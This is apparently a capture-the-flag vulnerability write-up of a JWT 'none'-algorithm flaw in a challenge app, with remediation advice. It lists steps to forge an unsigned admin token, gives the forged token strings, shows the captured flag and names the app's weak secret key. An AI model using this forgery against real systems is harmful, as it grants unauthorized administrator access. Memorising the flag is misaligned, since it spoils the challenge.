[Vulnerability Report]
Challenge: Insecure JWT Storage & Validation
Severity: Critical
Status: Confirmed

[Description]
The application uses JSON Web Tokens (JWT) for session management stored in `localStorage`. The server-side verification logic (`verifyJWT` in `api.php`) is vulnerable to the "None" algorithm attack, allowing attackers to forge tokens with arbitrary roles by stripping the signature.

[Exploitation Steps]
1. Retrieve the `nexus_token` from Local Storage.
   Example: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3Mzg...`
2. Decode the Base64 payload. Identify `"role": "guest"`.
3. Create a forged token:
   a. Header: `{"typ":"JWT","alg":"none"}` -> Base64: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=`
   b. Payload: `{"role":"admin"}` -> Base64: `eyJyb2xlIjoiYWRtaW4ifQ==`
   c. Signature: (Empty)
4. Construct the token: `header.payload.` (Note the trailing period).
   Result: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJyb2xlIjoiYWRtaW4ifQ==.`
5. Inject the forged token into `localStorage.setItem('nexus_token', '...')`.
6. Navigate to "Administration" -> "Execute SysAdmin Protocol".

[Finding]
The server accepts the unsigned admin token and returns the system configuration:
KEY: flag{jw7_st0r4g3_3xp0s3d}

[Remediation]
1. Configure the JWT library to explicitly reject the "none" algorithm.
2. Enforce a strong, specific algorithm (e.g., HS256) on verification.
3. Use a cryptographically strong secret key (not `nexus_secret_2024`).
